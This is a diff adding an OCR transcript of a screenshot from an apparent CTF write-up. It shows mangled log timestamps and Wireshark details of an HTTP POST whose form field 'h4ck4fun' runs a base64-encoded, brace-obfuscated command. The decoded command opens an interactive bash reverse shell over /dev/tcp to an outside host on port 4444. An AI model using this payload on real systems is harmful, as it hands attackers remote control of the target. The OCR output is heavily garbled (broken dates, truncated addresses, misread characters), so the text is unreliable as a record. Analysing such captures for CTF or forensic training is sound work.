@@ -1,0 +1,28 @@
+# OCR: fa7329a1eb98fcc5f377b46a1e9aed1b.webp
+# 来源: .\02-WriteUp\2025\fa7329a1eb98fcc5f377b46a1e9aed1b.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:41
+
+2025-85-26 :34:66.354537Z c .88。 192.168.6.
+2025-85-26 :35:28.8473797 2 -88. 192.168.0.
+2025-@5-26 135:43.887963Z 5 .88。 192.168.
+2025-@5-26 135:47.396737Z 5 .88。 192.168.
+2025-85-26 :35;52.7379897 5 .88。 192.168.
+2025-@5-26 135:56.782200Z 5 .88。 192.168.
+2025-85-26 :36:62.9448997 5 .88。 192.168.
+2025-85-26 :36:08.7689597 5 .88。 192.168.
+2025-@5-26 :36:16.9108417 5 .88。 192.168.
+2025-05-26 :36:22.3673197 5 .88。 192.168.
+2025-@5-26 136:31.943749Z 5 .88。 192.168.
+2025-85-26 :37:38.1563357 5 -88. 192.168.
+2025-95-26 = 38: QQ. 103020Z 。 :88: 192.168.
+Frame 7849: Packet, 935 bytes on wire (748@ bits), 935 bytes captured (748@ bits)
+Ethernet II, Src: Parallels_6e:f7:4b (@0:1c:42:6e:7:4b), Dst: Parallels_@@:00:18 (88:1c:42:88:88:18)
+Internet Protocol Version 4, Src: 10.211.88.7 (10.211.88.7), Dst: 192.168.8.177 (192.168.0.177)
+Transmission Control Protocol, Src Port: 60064, Dst Port: 10001, Seq: 1, Ack: 1, Len: 881
+Hypertext Transfer Protocol
+HTML Form URL Encoded: application/x-www-form-urlencoded
+~ Form item: "h4ck4fun" = "system("{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEUMTIZLjIyMi4zMzMvNDQ@NCAWPiYx} | {base64, -d}|
+Key: h4ck4fun
+Value: system("{echo, YmFzaCAtaSA+J iAVZGV2L3RjcC8xMTEUMTIzLjIyMi4zMzMvNDQ@NCAwPiYx} | {base64, -d}|{bash, -i}");
+车 一
